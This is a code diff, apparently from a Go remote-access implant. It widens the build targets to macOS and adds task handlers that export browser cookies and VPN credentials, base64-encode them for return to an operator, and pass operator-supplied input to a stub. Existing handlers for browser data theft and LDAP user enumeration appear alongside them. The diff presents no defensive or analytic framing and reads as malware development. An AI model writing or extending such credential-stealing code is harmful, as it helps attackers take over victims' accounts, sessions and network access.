@@ -1,5 +1,5 @@
-//go:build linux || windows
-// +build linux windows
+//go:build linux || windows || darwin
+// +build linux windows darwin
 
 package main
 
@@ -209,6 +209,30 @@ func handleBrowserSteal(task Task, res *TaskResult) {
 	out := stealBrowserData(task.Command)
 	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
 	res.Encoding = "base64"
+}
+
+func handleCookieExport(task Task, res *TaskResult) {
+	browser := task.Command
+	if browser == "" {
+		browser = "all"
+	}
+	out := exportCookies(browser)
+	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
+	res.Encoding = "base64"
+}
+
+func handleVpnCreds(task Task, res *TaskResult) {
+	out := exportVpnCreds()
+	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
+	res.Encoding = "base64"
+}
+
+func handleRemoteInput(task Task, res *TaskResult) {
+	payload := task.Data
+	if payload == "" {
+		payload = task.Command
+	}
+	res.Output = remoteInputStub(payload)
 }
 
 func handleLDAPUsers(task Task, res *TaskResult) {
